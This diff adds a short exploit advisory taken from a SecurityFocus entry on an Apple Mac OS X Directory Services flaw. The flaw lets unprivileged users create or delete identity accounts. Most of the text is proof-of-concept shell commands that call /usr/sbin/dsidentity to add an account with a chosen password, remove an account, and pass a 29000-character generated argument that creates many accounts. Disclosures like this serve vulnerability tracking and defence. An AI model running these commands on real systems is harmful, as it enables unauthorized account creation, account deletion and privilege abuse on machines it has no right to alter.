@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/14630/info
+
+A vulnerability in Apple Directory Services allows unprivileged users to create or delete directory services idnetity accounts.
+
+This issue was originally described in BID 14567 Apple Mac OS X Multiple Vulnerabilities. It is now being assigned its own BID. 
+
+To create an account named 'Username' with the password 'pass':
+Victim:~ kevinfinisterre$ /usr/sbin/dsidentity -a Username -s pass -v
+
+To delete an account named 'Username':
+Victim:~ kevinfinisterre$ /usr/sbin/dsidentity -r Username -v
+
+To create multiple accounts:
+Victim:~ kevinfinisterre$ /usr/sbin/dsidentity -a `perl -e 'print "A" x 29000'`
+
